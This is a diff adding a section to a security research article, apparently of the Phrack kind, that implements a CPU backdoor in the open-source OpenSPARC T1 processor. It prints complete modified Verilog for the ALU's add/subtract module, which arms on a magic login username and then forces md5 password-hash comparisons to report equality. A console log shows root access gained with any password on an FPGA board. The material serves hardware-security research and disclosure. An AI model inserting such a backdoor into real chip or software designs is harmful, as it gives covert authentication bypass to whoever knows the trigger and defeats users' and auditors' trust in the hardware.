@@ -123,7 +123,7 @@ paper.
 of AMD K7 processors. Internet user Czernobyl reveals that undocumented
 MSRs are used for debugging purposes[15]. For instance, MSR
 0xC0010115 is used to access physical memory. Put the physical address into
-the EBX register and the 64-bit value into EDX, EAX registers, and then use
+the EBX register and the 64-bit value into EDX and EAX registers, and then use
 RDMSR or WRMSR to read/write the physical memory. In particular, this
 function is undocumented but does not require a password. But for many
 other MSRs, it needs to put the password 0x9C5A203A in the EDI to enable
@@ -371,6 +371,670 @@ ALU module. The following section will cover this part.
 
 
 
+--[ 3.3 On a Real CPU: OpenSPARC T1
+
+
+
+To show how this backdoor is practical in a commercial CPU, I decided to
+implement it in OpenSPARC T1. OpenSPARC is an open-source hardware project
+that started in December 2005. OpenSPARC T1 is the open-source version of
+the Sun Microsystems' UltraSPARC T1, which is multithreading, multicore
+CPU,  code name Niagara.
+
+OpenSPARC T1 contains multiple sparc cores, a single-issue, in-order,
+6-stage pipeline core. The source code is available under GNU General
+Public License v2. Xilinx's OpenSPARC Evaluation Platform is an FPGA board
+designed for hosting a whole OpenSPARC T1 system, including CPU, DDR memory
+controller, northbridge, etc. With the source code and those Xilinx EDA
+tools and the FPGA board, that's the real commercial CPU as far as I can
+get.
+
+The OpenSPARC project also provides two ramdisk images that can run on top
+of the FPGA emulated system, SunOS 5.11 and Ubuntu7.10. Those systems are
+old. They both have a 64-bit kernel, but the user-mode programs are
+32-bits. According to the "SPARC Assembly Language Reference Manual[x]," a
+32-bit program could use the entire length of some of the 64-bit registers.
+"The global registers and the output registers can be used to hold 64-bit
+integer values, but the input registers and the local registers can only be
+used to hold 32-bit values in the lower half of the register."
+
+The Linux distro Ubuntu7.10 contains 32-bit libc-2.6.1.so, whose strcmp()
+uses 64-bit registers to hold parts of the Src and Dst strings. If the two
+strings' addresses are 8-byte aligned, strcmp() does the comparison using a
+pseudo instruction CMP, a SUBcc, with 64-bit register operands.  Otherwise,
+the strcmp() will go a single-byte route.
+
+SunOS 5.11, on the other hand, their libc library is compiled in a way that
+the instructions only use 32-bit operands. They didn't leverage the larger
+registers even if they could. It is not surprising since the libc used by
+these two systems does not have a common heritage.  
+
+Later, I checked Debian 9.0, a purely 64-bit system on SPARC64
+architecture. Its strcmp() function behaves like the Ubuntu7.10 on a
+SPARC32+ architecture. I have to say, at the instruction level, from the
+perspective of our CPU backdoor, the Linux system (more specifically, the
+Debian system) has not changed much over the years. Although on Debian9.0,
+it uses XOR instead of CMP to make the integer comparison. A small change
+can make the backdoor we designed ineffective. That is why we argue that
+even hardware backdoors need software assistance. 
+
+If we originally designed the backdoor on the SUB instruction, and the
+later system used the XOR instruction instead, our backdoor would be
+invalid. In reality, Maybe the CPU vendor can convince the compiler guys
+not to make the change if it matters. Still, the reality is that there is a
+lot of elderly code that runs perfectly on billions of computers. As
+aforementioned, the Windows authentication library msv1_0.dll is a good
+example. 
+
+There is another issue with *nix systems. They use salt. On SunOS 5.11,
+When you change your password, the /bin/passwd program selects a salt based
+on the time of day, and the salt is converted into a two-character string
+and is stored as part of the hash. 
+
+To make the point, I will make this particular CPU backdoor on the SUBcc
+instruction of the OpenSPARC T1 CPU for the Ubuntu 7.10 system. It targets
+the login process, which uses libpam (Pluggable Authentication Modules for
+Linux) to verify the password against the stored hash string. On
+Ubuntu7.10, like all other Linux systems,  the administrator could choose
+between different hash algorithms such as MD5 and SHA256. 
+
+"root:$1$7c71xB0y$mPkMSwwbMWgEXsyD6YV/C1:14168:0:99999:7:::"
+
+"u:$6$zE3nVD4laY6MS31E$NK4TnaebdS.O9FX9Q.pg7/yH.fH5bi8bHCFJdFbEaPtmW/59KK
+B7JDk53W21ZoLnKhrkmB4u5cXE.9ynmeIEw0:18811:0:99999:7:::"
+
+Take md5 as an example. The hash starts with $1$. The second part is the
+salt string that ends with another $, and its size varies depending on the
+algorithm. The rest are the hash.
+
+The problem is that, unlike windows, with salt mixed during the hash
+process, even the same password could generate millions of different hash
+strings. After the hashing process, the CPU could no longer recognize the
+backdoor password. For this reason, the only way to send a clear message to
+the CPU during authentication is the user name. It is so especially when
+authenticating through a network.
+
+Therefore, we need to turn on/off the CPU backdoor by entering unique
+usernames. The libpam takes the username and looks it up in the
+/etc/password file. For example, "00000000" is the secret key to turn on
+the CPU backdoor. This 8-byte username will be put into a 64-bit register
+and treated as an integer. The CPU will see a "CMP reg-rs1 reg-rs2"
+instruction with 0x726f6f7400000000 in the rs1 register and
+0x3030303030303030 in the rs2 register. It is "00000000" compared with
+"root," usually the first username in a *nix system.
+
+When the CPU sees this, it looks further for the hash comparison. The sign
+would be $1$ in both rs1 and rs2 registers. Why is that?  Let's look at the
+hash strings in the /etc/shadow file.
+
+"root:$1$7c71xB0y$mPkMSwwbMWgEXsyD6YV/C1:14168:0:99999:7:::"
+
+The hash string has three parts. The $1$ indicates the algorithm is md5,
+"7c71xB0y"  is the salt, and "mPkMSwwbMWgEXsyD6YV/C1" is the actual hash.
+The hash function in the *nix system mostly looks like the following.
+
+char * crypt(const char *phrase, const char *setting);
+
+For example, the libpam passes the user's input password and the hash
+string from the /etc/shadow file to the crypt() function.
+
+pp = crypt("passwordinputed", "$1$somesalt$hashedstring");
+
+The returned value is a pointer to the newly generated hash string, and
+they both are sent to strcmp() for comparison. 
+
+strcmp(pp, stored_hash);
+
+When the CMP instruction has the two register operands that begin with $1$,
+we know the CPU verifies the user password. And this is the place we need
+to modify the result. The CPU will say they are equal no matter the newly
+generated hash.
+
+OpenSPARC T1 is a single-issue, in-order processor written in Verilog.
+Unlike the emulator, the actual CPU has many pipeline stages, and different
+tasks are spread into each stage. The sparc core is composed of
+IFU(Instruction Fetch Unit), EXU(execution Unit), LSU(Load-Store Unit),
+TLU(Trap Logic Unit), etc. For simplicity, we can think of the core as two
+parts, IFU and EXU， where IFU gets the instructions from the cache/memory,
+and the EXU executes them.
+
+The core pipeline consists of six stages: Fetch, Switch, Decode, Execute,
+Memory, and Writeback. The IFU includes Fetch, Switch, and Decode. The EXU
+includes the Execute stage of the pipeline and contains four subunits
+ALU(Arithmetic and logic unit), SHFT(Shifter), IMUL(Integer multiplier),
+and IDI(Integer divider).
+
+Ths sparc core has hardware support for four strands(virtual processor) and
+each strand has a full register file. The Fetch cycle loads instructions to
+the instruction registers from the instruction cache. The Switch stage
+selects which strand to run. Then the selected strand's next instruction is
+decoded in the Decode stage. The register file access also happens at this
+time. In the Execute stage, all arithmetic and logical operations take
+place. The LSU also calculates the memory address at this stage, and the
+data cache is accessed in the Memory stage. Finally, all instructions are
+committed in the Writeback stage.
+
+To modify the behavior of a CMP(SUBcc) instruction, we can work on the ALU
+subunits of the EXU module. At the Execute cycle, the two operands of a SUB
+instruction are read out and sent to the ALU. 
+
+
+The following is the ALU module code.
+
+module sparc_exu_alu
+(
+ /*AUTOARG*/
+   // Outputs
+   so, alu_byp_rd_data_e, exu_ifu_brpc_e, exu_lsu_ldst_va_e, 
+   exu_lsu_early_va_e, exu_mmu_early_va_e, alu_ecl_add_n64_e, 
+   alu_ecl_add_n32_e, alu_ecl_log_n64_e, alu_ecl_log_n32_e, 
+   alu_ecl_zhigh_e, alu_ecl_zlow_e, exu_ifu_regz_e, exu_ifu_regn_e, 
+   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
+   alu_ecl_adder_out_63_e, alu_ecl_cout32_e, alu_ecl_cout64_e_l, 
+   alu_ecl_mem_addr_invalid_e_l, 
+   // Inputs
+   rclk, se, si, byp_alu_rs1_data_e, byp_alu_rs2_data_e_l, 
+   byp_alu_rs3_data_e, byp_alu_rcc_data_e, ecl_alu_cin_e, ecl_alu_rd_e, 
+   ifu_exu_invert_d, ecl_alu_log_sel_and_e, ecl_alu_log_sel_or_e, 
+   ecl_alu_log_sel_xor_e, ecl_alu_log_sel_move_e, 
+   ecl_alu_out_sel_sum_e_l, ecl_alu_out_sel_rs3_e_l, 
+   ecl_alu_out_sel_shift_e_l, ecl_alu_out_sel_logic_e_l, 
+   shft_alu_shift_out_e, ecl_alu_sethi_inst_e, ifu_lsu_casa_e
+   );
+   input rclk;
+   input se;
+   input si;
+   input [63:0] byp_alu_rs1_data_e;   // source operand 1
+   input [63:0] byp_alu_rs2_data_e_l;  // source operand 2
+   input [63:0] byp_alu_rs3_data_e;  // source operand 3
+   input [63:0] byp_alu_rcc_data_e;  // source operand for reg cond codes
+   input        ecl_alu_cin_e;            // cin for adder
+   input [4:0]  ecl_alu_rd_e;        // uty: test
+   input        ifu_exu_invert_d;
+   input  ecl_alu_log_sel_and_e;// These 4 wires are select lines
+   input  ecl_alu_log_sel_or_e;// for the logic block mux.
+   input  ecl_alu_log_sel_xor_e;// active high and choose the
+   input  ecl_alu_log_sel_move_e; // output they describe
+   input  ecl_alu_out_sel_sum_e_l;// The following 4 are select lines
+   input  ecl_alu_out_sel_rs3_e_l;// for the output stage mux. They are 
+   input  ecl_alu_out_sel_shift_e_l;// active high and choose the 
+   input  ecl_alu_out_sel_logic_e_l;// output of the respective block.
+   input [63:0] shft_alu_shift_out_e;// result from shifter
+   input        ecl_alu_sethi_inst_e;
+   input        ifu_lsu_casa_e;
+   
+   output       so;
+   output [63:0] alu_byp_rd_data_e;          // alu result
+   output [47:0] exu_ifu_brpc_e;// branch pc output
+   output [47:0] exu_lsu_ldst_va_e; // address for lsu
+   output [10:3] exu_lsu_early_va_e; // faster bits for cache
+   output [7:0]  exu_mmu_early_va_e;
+   output        alu_ecl_add_n64_e;
+   output        alu_ecl_add_n32_e;
+   output        alu_ecl_log_n64_e;
+   output        alu_ecl_log_n32_e;
+   output        alu_ecl_zhigh_e;
+   output        alu_ecl_zlow_e;
+   output    exu_ifu_regz_e;              // rs1_data == 0 
+   output    exu_ifu_regn_e;
+   output    alu_ecl_adderin2_63_e;
+   output    alu_ecl_adderin2_31_e;
+   output    alu_ecl_adder_out_63_e;
+   output    alu_ecl_cout32_e;       // To ecl of sparc_exu_ecl.v
+   output    alu_ecl_cout64_e_l;       // To ecl of sparc_exu_ecl.v
+   output    alu_ecl_mem_addr_invalid_e_l;
+                                
+   wire         clk;
+   wire [63:0] logic_out;       // result of logic block
+   wire [63:0] adder_out;       // result of adder
+   wire [63:0] spr_out;         // result of sum predict
+   wire [63:0] zcomp_in;        // result going to zcompare
+   wire [63:0] va_e;            // complete va
+   wire [63:0] byp_alu_rs2_data_e;
+   wire        invert_e;
+   wire        ecl_alu_out_sel_sum_e;
+   wire        ecl_alu_out_sel_rs3_e;
+   wire        ecl_alu_out_sel_shift_e;
+   wire        ecl_alu_out_sel_logic_e;
+   assign      clk = rclk;
+   assign      byp_alu_rs2_data_e[63:0] = ~byp_alu_rs2_data_e_l[63:0];
+   assign      ecl_alu_out_sel_sum_e = ~ecl_alu_out_sel_sum_e_l;
+   assign      ecl_alu_out_sel_rs3_e = ~ecl_alu_out_sel_rs3_e_l;
+   assign      ecl_alu_out_sel_shift_e = ~ecl_alu_out_sel_shift_e_l;
+   assign      ecl_alu_out_sel_logic_e = ~ecl_alu_out_sel_logic_e_l;
+
+   // Zero comparison for exu_ifu_regz_e
+   sparc_exu_aluzcmp64 regzcmp(.in(byp_alu_rcc_data_e[63:0]), 
+				.zero64(exu_ifu_regz_e));
+   assign     exu_ifu_regn_e = byp_alu_rcc_data_e[63];
+
+   // mux between adder output and rs1 (for casa) for lsu va
+   dp_mux2es #(64)  lsu_va_mux(.dout(va_e[63:0]),
+                               .in0(adder_out[63:0]),
+                               .in1(byp_alu_rs1_data_e[63:0]),
+                               .sel(ifu_lsu_casa_e));
+   assign     exu_lsu_ldst_va_e[47:0] = va_e[47:0];
+   // for bits 10:4 we have a separate bus that is not used for cas
+   assign     exu_lsu_early_va_e[10:3] = adder_out[10:3];
+   // mmu needs bits 7:0
+   assign     exu_mmu_early_va_e[7:0] = adder_out[7:0];
+   
+   
+   // Adder
+   assign     exu_ifu_brpc_e[47:0] = adder_out[47:0];
+   assign     alu_ecl_adder_out_63_e = adder_out[63];
+   sparc_exu_aluaddsub addsub(.adder_out(adder_out[63:0]),
+                        /*AUTOINST*/
+                        // Outputs
+                        .spr_out  (spr_out[63:0]),
+                        .alu_ecl_cout64_e_l(alu_ecl_cout64_e_l),
+                        .alu_ecl_cout32_e(alu_ecl_cout32_e),
+                        .alu_ecl_adderin2_63_e(alu_ecl_adderin2_63_e),
+                        .alu_ecl_adderin2_31_e(alu_ecl_adderin2_31_e),
+                        // Inputs
+                        .clk      (clk),
+                        .se       (se),
+                        .byp_alu_rs1_data_e(byp_alu_rs1_data_e[63:0]),
+                        .byp_alu_rs2_data_e(byp_alu_rs2_data_e[63:0]),
+                        .ecl_alu_cin_e(ecl_alu_cin_e),
+  		        .ecl_alu_rd_e(ecl_alu_rd_e),   // uty: test
+                        .ifu_exu_invert_d(ifu_exu_invert_d));
+
+   // Logic/pass rs2_data
+   dff_s invert_d2e(.din(ifu_exu_invert_d), .clk(clk), .q(invert_e), 
+                    .se(se), .si(), .so());
+   sparc_exu_alulogic logic(.rs1_data(byp_alu_rs1_data_e[63:0]),
+                       .rs2_data(byp_alu_rs2_data_e[63:0]),
+                       .isand(ecl_alu_log_sel_and_e),
+                       .isor(ecl_alu_log_sel_or_e),
+                       .isxor(ecl_alu_log_sel_xor_e),
+                       .pass_rs2_data(ecl_alu_log_sel_move_e),
+                       .inv_logic(invert_e), .logic_out(logic_out[63:0]),
+                       .ifu_exu_sethi_inst_e(ecl_alu_sethi_inst_e));
+
+   // Mux between sum predict and logic outputs for zcc
+   dp_mux2es #(64)  zcompmux(.dout(zcomp_in[63:0]),
+                           .in0(logic_out[63:0]),
+                           .in1(spr_out[63:0]),
+                           .sel(ecl_alu_out_sel_sum_e));
+
+   // Zero comparison for zero cc
+//   sparc_exu_aluzcmp64 zcccmp(.in(zcomp_in[63:0]), 
+//                          .zero64(alu_ecl_z64_e),
+//                          .zero32(alu_ecl_z32_e));
+   assign        alu_ecl_zlow_e = ~(|zcomp_in[31:0]);
+   assign        alu_ecl_zhigh_e = ~(|zcomp_in[63:32]);
+
+   // Get Negative ccs
+   assign   alu_ecl_add_n64_e = adder_out[63];
+   assign   alu_ecl_add_n32_e = adder_out[31];
+   assign   alu_ecl_log_n64_e = logic_out[63];
+   assign   alu_ecl_log_n32_e = logic_out[31];
+
+   
+   // Mux for output
+   mux4ds #(64) output_mux(.dout(alu_byp_rd_data_e[63:0]), 
+                         .in0(adder_out[63:0]),
+                         .in1(byp_alu_rs3_data_e[63:0]),
+                         .in2(shft_alu_shift_out_e[63:0]),
+                         .in3(logic_out[63:0]), 
+                         .sel0(ecl_alu_out_sel_sum_e),
+                         .sel1(ecl_alu_out_sel_rs3_e),
+                         .sel2(ecl_alu_out_sel_shift_e),
+                         .sel3(ecl_alu_out_sel_logic_e));
+
+   // memory address checks
+   sparc_exu_alu_16eql chk_mem_addr(.equal(alu_ecl_mem_addr_invalid_e_l),
+                                    .in(va_e[63:47]));
+   
+endmodule  // sparc_exu_alu
+
+The ALU contains sparc_exu_alulogic and sparc_exu_aluaddsub modules.  The
+former is responsible for logical operations, while the latter is
+responsible for addition and subtraction. The backdoor is on SUBcc
+instruction, therefore will need to make changes to the sparc_exu_aluaddsub
+module. 
+
+In this module alone, we almost get everything to implement the backdoor.
+For example, from the inputs, byp_alu_rs1_data_e and byp_alu_rs2_data_e are
+the two operands value. ecl_alu_cin_e and ifu_exu_invert_d tell us whether
+this operation is addition or subtraction.  It was enough for an adder
+module, but for us, we also need the information about the rd register.
+Because, as mentioned earlier, CMP is a pseudo instruction.
+
+"cmp reg rs1 , reg_or_imm" is "subcc reg rs1 , reg_or_imm, %g0"
+
+The rd is the destination register index of which content needs to be
+updated in the Write stage. A SUBcc instruction with rd = 0 can be used to
+effect a signed or unsigned integer comparison. It does not change any
+general register because g0 is a special register that always is zero. The
+rd index is encoded in the instruction, which is available after the Decode
+stage, and the sparc_exu_ecl(control logic) module stores all its pipeline
+registers. So we got ecl_alu_rd_e from the ecl. The suffix _e indicates
+that this signal is used in the Execution stage. We need this information
+to tell the difference between CMP and SUBcc instruction. Soon I will
+explain why this is important.
+
+Here is the sparc_exu_aluaddsub module before we add the backdoor. 
+
+module sparc_exu_aluaddsub
+  (/*AUTOARG*/
+   // Outputs
+   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e, 
+   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
+   // Inputs
+   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, 
+   ifu_exu_invert_d
+   );
+   input clk;
+   input se;
+   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
+   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
+   input         ecl_alu_cin_e;           // carry in
+   input         ifu_exu_invert_d;     // subtract used by adder
+
+   output [63:0] adder_out; // result of adder
+   output [63:0] spr_out;   // result of sum predict
+   output         alu_ecl_cout64_e_l;
+   output         alu_ecl_cout32_e;
+   output       alu_ecl_adderin2_63_e;
+   output       alu_ecl_adderin2_31_e;
+   
+   wire [63:0]  rs2_data;       // 2nd input to adder
+   wire [63:0]  rs1_data;       // 1st input to adder
+   wire [63:0]  subtract_d;
+   wire [63:0]  subtract_e;
+   wire         cout64_e;
+   
+////////////////////////////////////////////
+//  Module implementation
+////////////////////////////////////////////
+   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
+   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk), 
+                       .q(subtract_e[63:0]), .se(se),
+                       .si(), .so());
+
+   assign   rs1_data[63:0] = byp_alu_rs1_data_e[63:0];
+
+   assign   rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
+   
+   assign   alu_ecl_adderin2_63_e = rs2_data[63];
+   assign   alu_ecl_adderin2_31_e = rs2_data[31];
+   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]), 
+                              .rs2_data(rs2_data[63:0]),
+                              .cin(ecl_alu_cin_e), 
+                              .adder_out(adder_out[63:0]),
+                              .cout32(alu_ecl_cout32_e), 
+                              .cout64(cout64_e));
+   assign   alu_ecl_cout64_e_l = ~cout64_e;
+
+
+   // sum predict
+   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]), 
+                        .rs2_data(rs2_data[63:0]), 
+                        .cin(ecl_alu_cin_e),
+                        .spr_out(spr_out[63:0]));
+
+endmodule // sparc_exu_aluaddsub
+
+In a CPU, addition and subtraction are all computed as additions. The
+difference is that subtraction takes the complement of the subtrahend and
+then adds. The ifu_exu_invert_d indicates a subtraction and is used to flip
+all the bits of the second operands. It is sent in the Decode stage, so the
+pipeline register is required to save it to the next stage. ecl_alu_cin_e
+is 1 in SUB and 0 in SUBC(SUB with Carry) instruction.
+
+There is an adder and sparc_exu_aluspr for which the comment says sum
+prediction. It is an optimized compare operation with carry, and if the two
+operands are equal, spr_out is 0. We need to change their results to zero
+if the ALU is computing subtraction on the hash string after activating the
+backdoor so that the two hash strings appear to be equal.
+
+The following is the sparc_exu_aluaddsub module after adding the backdoor.
+
+module sparc_exu_aluaddsub
+  (/*AUTOARG*/
+   // Outputs
+   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e, 
+   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
+   // Inputs
+   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, 
+   ecl_alu_rd_e, // uty: test 
+   ifu_exu_invert_d
+   );
+   input clk;
+   input se;
+   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
+   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
+   input         ecl_alu_cin_e;           // carry in
+   input [4:0]   ecl_alu_rd_e;	       // uty: test
+   input         ifu_exu_invert_d;     // subtract used by adder
+
+   output [63:0] adder_out; // result of adder
+   output [63:0] spr_out;   // result of sum predict
+   output         alu_ecl_cout64_e_l;
+   output         alu_ecl_cout32_e;
+   output       alu_ecl_adderin2_63_e;
+   output       alu_ecl_adderin2_31_e;
+   
+   wire [63:0]  rs2_data;       // 2nd input to adder
+   wire [63:0]  rs1_data;       // 1st input to adder
+   wire [63:0]  subtract_d;
+   wire [63:0]  subtract_e;
+   wire         cout64_e;
+
+   wire [63:0]  spr_out_tmp;   // result of sum predict
+   wire [63:0]  adder_out_tmp; // result of adder
+   wire         alu_ecl_cout32_e_tmp;
+   wire 	backdoor_on_keyword;
+   wire		backdoor_off_keyword;
+   wire		backdoor_nxt;
+   wire		backdoor_r;
+   wire		backdoor_en;
+   wire		trigger_backdoor;
+   wire		hash_begin;
+   wire		hash_end;
+   wire		hash_00;
+   wire		hash_r;
+   wire		hash_en;
+   wire		hash_nxt;
+
+   wire		issubrd0;
+   wire		sub_e;
+
+////////////////////////////////////////////
+//  Module implementation
+////////////////////////////////////////////
+   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
+   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk), 
+                     .q(subtract_e[63:0]), .se(se),
+                     .si(), .so());
+
+   assign   rs1_data[63:0] = byp_alu_rs1_data_e[63:0];
+
+   assign   rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
+   
+   assign   alu_ecl_adderin2_63_e = rs2_data[63];
+   assign   alu_ecl_adderin2_31_e = rs2_data[31];
+   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]), 
+                              .rs2_data(rs2_data[63:0]),
+                              .cin(ecl_alu_cin_e), 
+                              .adder_out(adder_out_tmp[63:0]),
+                              .cout32(alu_ecl_cout32_e_tmp), 
+                              .cout64(cout64_e_tmp));
+   assign   cout64_e = cout64_e_tmp | trigger_backdoor;
+   assign   alu_ecl_cout64_e_l = ~cout64_e;
+   assign   alu_ecl_cout32_e = alu_ecl_cout32_e_tmp | trigger_backdoor;
+
+
+   // sum predict
+   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]), 
+                        .rs2_data(rs2_data[63:0]), .cin(ecl_alu_cin_e),
+                        .spr_out(spr_out_tmp[63:0]));
+
+   // uty: test
+   // 0x726f6f74 root
+   
+   // sub_e sub_dff is at sparc_exu_ecl, just put one here for convience
+   dff_s alusub_dff(.din(ifu_exu_invert_d), .clk(clk), .q(sub_e), .se(se),
+	   .si(), .so());
+   
+   assign backdoor_on_keyword = 
+                        (64'h3030303030303030 == byp_alu_rs2_data_e[63:0])
+                     && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
+   assign backdoor_off_keyword = 
+                        (64'h3030303030303031 == byp_alu_rs2_data_e[63:0])
+                     && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
+
+   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
+
+   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
+   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));
+
+   dffe_s #(1) backdoor_dff(.din(backdoor_nxt), .en(backdoor_en),
+	   		.clk(clk), .q(backdoor_r), .se(se),
+                     	.si(), .so());
+
+   // only consider $1$ for now
+   assign hash_begin =    ((24'h243124 == byp_alu_rs1_data_e[63:40])
+                       && (24'h243124 == byp_alu_rs2_data_e[63:40]))
+                        & issubrd0; 
+
+   assign hash_00 =   (8'h0 == byp_alu_rs1_data_e[47:40])
+                    & (8'h0 == byp_alu_rs2_data_e[47:40]); 
+   assign hash_end = hash_r & hash_00 & issubrd0;
+
+   assign hash_en = (hash_begin | hash_end) & backdoor_r;
+   assign hash_nxt = hash_begin & (~hash_end);
+
+   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
+	   		.clk(clk), .q(hash_r), .se(se),
+                     	.si(), .so());
+
+
+   // ifu_exu_invert_d & ecl_alu_cin_e, make sure it is a SUB/SUBcc
+   // instruction. (SUBC's ecl_alu_cin_e actually is 0)
+   // hash_r will update at next cycle.
+   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0; 
+
+   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}}; 
+   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
+
+endmodule // sparc_exu_aluaddsub
+
+
+
+
+backdoor_on_keyword and backdoor_on_keyword are signaled when the magic
+word is input as the username when login. For testing, the magic keyword is
+00000000 to turn on the backdoor and 00000001 to turn it off.  But the
+magic word should be as strange as possible so that it is not easy to
+conflict in the day-to-day operation of the system.
+
+I want to implement a switch-like function where the back door stays open
+until the off magic word is entered. So a DFF with enable is used to save
+the current state. Following is the logic and truth table that describes
+it. Under normal circumstances, backdoor_on_keyword and
+backdoor_off_keyword will not appear simultaneously.
+
+
+   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
+   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));
+
+on_keyword  |  off_keyword   |    en     |  nxt    
+     0              0              0         0
+     0              1              1         0
+     1              0              1         1  
+     1              1              1         0             
+
+When the backdoor is activated, all subsequent password verifications will
+pass unconditionally. The key is determining whether the ALU is comparing
+part of two hash strings because many instructions such as load and branch
+also need to use the ALU.
+
+   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
+
+A hash string must be divided into several 64-bit integers and compared
+multiple times. The first thing to do is determine whether this is a CMP
+instruction. Then judge by the pattern of the hash string, such as starting
+with $1$ to determine whether the hash comparison has begun because the
+subsequent comparison is only a string comparison, and there is no
+noticeable pattern. 
+
+$1$7c71x        0x2431243763373178
+B0y$mPkM        0x423079246d506b4d
+SwwbMWgE        0x537777624d576745
+XsyD6YV/        0x587379443659562f
+C1              0x4331
+
+   assign hash_begin =   ((24'h243124 == byp_alu_rs1_data_e[63:40]) 
+                      && (24'h243124 == byp_alu_rs2_data_e[63:40])) 
+                       & issubrd0;
+
+If 0x00 appears in both operands in the subsequent comparison, it means
+that this is the last part of the hash string, and it should also pass. 
+
+   assign hash_00 =   (8'h0 == byp_alu_rs1_data_e[47:40]) 
+                    & (8'h0 == byp_alu_rs2_data_e[47:40]);
+   assign hash_end = hash_r & hash_00 & issubrd0;
+
+
+Adding more combinatorial logic can make this backdoor more applicable to
+different hash algorithms. On the other hand, more combinational logic
+requires a longer propagation time, so it can not be too complicated. For
+testing, this part of the logic is a bit hardcoded. Simply filtering these
+patterns in the operands may conflict with many benign CMP instructions.
+However, the scenario of using this backdoor is to open the backdoor, log
+in to any account, and then close the backdoor as quickly as possible. It
+can avoid affecting other programs and prevent backdoor from being exposed.
+
+
+Another DFF is used to save the state of whether the hash string comparison
+continues. If its output is one, the current CMP instruction should be
+compromised and return an equal result.
+
+
+   assign hash_en = (hash_begin | hash_end) & backdoor_r;
+   assign hash_nxt = hash_begin & (~hash_end);
+
+   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
+                        .clk(clk), .q(hash_r), .se(se),
+                        .si(), .so());
+
+   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;
+
+
+The following screen output shows how the CPU backdoor works on the
+OpenSPARC T1 FPGA system.
+
+Ubuntu 7.10 t1-fpga-00 ttyS0
+
+t1-fpga-00 login: 00000000
+Password:                 ---> enter anything
+
+Login incorrect
+t1-fpga-00 login: root
+Password:                   ---> enter anything
+Linux t1-fpga-00 2.6.22-15-sparc64-smp #110 SMP Wed Mar 18 16:53:44 PDT
+2009 sparc64
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.  
+root@t1-fpga-00:~# 
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -422,3 +1086,4 @@ ALU module. The following section will cover this part.
      http://cbid.softnology.biz/html/undocmsrs.html
 [25] https://wiki.qemu.org/Documentation/TCG/frontend-ops
 
+[26] https://docs.oracle.com/cd/E36784_01/pdf/E36858.pdf
